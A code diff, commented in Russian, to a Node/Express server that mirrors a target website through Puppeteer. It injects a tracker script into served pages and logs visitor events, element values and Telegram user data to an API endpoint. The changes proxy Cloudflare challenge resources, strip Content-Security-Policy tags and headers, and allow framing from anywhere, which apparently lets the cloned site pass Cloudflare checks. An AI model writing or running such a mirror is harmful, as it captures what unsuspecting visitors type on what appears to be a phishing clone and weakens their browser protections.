@@ -137,6 +137,52 @@ const trackerScript = `
 </script>
 `;
 
+// Проксируем Cloudflare CDN запросы
+app.use('/cdn-cgi', async (req, res) => {
+  const cdnUrl = TARGET_SITE + req.originalUrl;
+  console.log('Proxying CDN:', cdnUrl);
+  
+  try {
+    const https = require('https');
+    const http = require('http');
+    const urlModule = require('url');
+    
+    const parsedUrl = urlModule.parse(cdnUrl);
+    const protocol = parsedUrl.protocol === 'https:' ? https : http;
+    
+    const options = {
+      hostname: parsedUrl.hostname,
+      port: parsedUrl.port,
+      path: parsedUrl.path,
+      method: req.method,
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'Accept': req.headers.accept || '*/*',
+        'Referer': TARGET_SITE
+      }
+    };
+    
+    const proxyReq = protocol.request(options, (proxyRes) => {
+      res.writeHead(proxyRes.statusCode, proxyRes.headers);
+      proxyRes.pipe(res);
+    });
+    
+    proxyReq.on('error', (err) => {
+      console.error('CDN proxy error:', err);
+      res.status(500).send('CDN Error');
+    });
+    
+    if (req.method === 'POST') {
+      req.pipe(proxyReq);
+    } else {
+      proxyReq.end();
+    }
+  } catch (err) {
+    console.error('CDN error:', err);
+    res.status(500).send('Error');
+  }
+});
+
 // API логирования
 app.post('/api/log', async (req, res) => {
   const { sessionId, telegramUser, eventType, element, value, pageUrl } = req.body;
@@ -181,34 +227,66 @@ app.get('*', async (req, res) => {
     await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
     await page.setViewport({ width: 1920, height: 1080 });
     
-    // Быстрая загрузка - просто получаем HTML
+    // Перехватываем все запросы для логирования
+    await page.setRequestInterception(false);
+    
+    // Быстрая загрузка
     await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 30000 });
     
-    // Ждём 2 секунды для загрузки основного контента
-    await page.waitForTimeout(2000);
+    // Ждём загрузки Cloudflare скриптов
+    await page.waitForTimeout(3000);
     
     let html = await page.content();
     
-    // Внедряем трекер только если это не Cloudflare страница
+    // Проверяем Cloudflare
     const isCloudflare = html.includes('cf-challenge') || 
                          html.includes('Just a moment') || 
-                         html.includes('Verify you are human');
+                         html.includes('Verify you are human') ||
+                         html.includes('_cf_chl_opt');
     
-    if (!isCloudflare) {
+    if (isCloudflare) {
+      console.log('Cloudflare detected, fixing paths...');
+      
+      // Исправляем пути для Cloudflare ресурсов
+      const baseUrl = new URL(TARGET_SITE);
+      
+      // Заменяем относительные пути на абсолютные
+      html = html.replace(/src="\/cdn-cgi\//g, `src="${baseUrl.origin}/cdn-cgi/`);
+      html = html.replace(/href="\/cdn-cgi\//g, `href="${baseUrl.origin}/cdn-cgi/`);
+      html = html.replace(/action="\/\?__cf/g, `action="${baseUrl.origin}/?__cf`);
+      html = html.replace(/"\/cdn-cgi\//g, `"${baseUrl.origin}/cdn-cgi/`);
+      html = html.replace(/'\/cdn-cgi\//g, `'${baseUrl.origin}/cdn-cgi/`);
+      
+      // Добавляем base tag для правильной загрузки ресурсов
+      if (html.includes('<head>')) {
+        html = html.replace('<head>', `<head>\n<base href="${baseUrl.origin}/">`);
+      }
+      
+      // Убираем CSP заголовки которые могут блокировать
+      html = html.replace(/<meta[^>]*http-equiv=["']Content-Security-Policy["'][^>]*>/gi, '');
+      
+    } else {
+      // Обычная страница - внедряем трекер
       if (html.includes('</body>')) {
         html = html.replace('</body>', trackerScript + '</body>');
       } else {
         html += trackerScript;
       }
+      
+      // Исправляем пути для обычных ресурсов
+      const baseUrl = new URL(TARGET_SITE);
+      html = html.replace(/src="\/([^"]+)"/g, `src="${baseUrl.origin}/$1"`);
+      html = html.replace(/href="\/([^"]+)"/g, `href="${baseUrl.origin}/$1"`);
+      html = html.replace(/url\(\/([^)]+)\)/g, `url(${baseUrl.origin}/$1)`);
     }
     
-    // Исправляем относительные пути для ресурсов
-    const baseUrl = new URL(TARGET_SITE);
-    html = html.replace(/src="\/([^"]+)"/g, `src="${baseUrl.origin}/$1"`);
-    html = html.replace(/href="\/([^"]+)"/g, `href="${baseUrl.origin}/$1"`);
-    html = html.replace(/url\(\/([^)]+)\)/g, `url(${baseUrl.origin}/$1)`);
-    
+    // Важные заголовки для работы Cloudflare
     res.setHeader('Content-Type', 'text/html; charset=utf-8');
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('X-Frame-Options', 'ALLOWALL');
+    res.removeHeader('Content-Security-Policy');
+    res.removeHeader('X-Content-Security-Policy');
+    
     res.send(html);
   } catch (err) {
     console.error('Puppeteer error:', err.message);
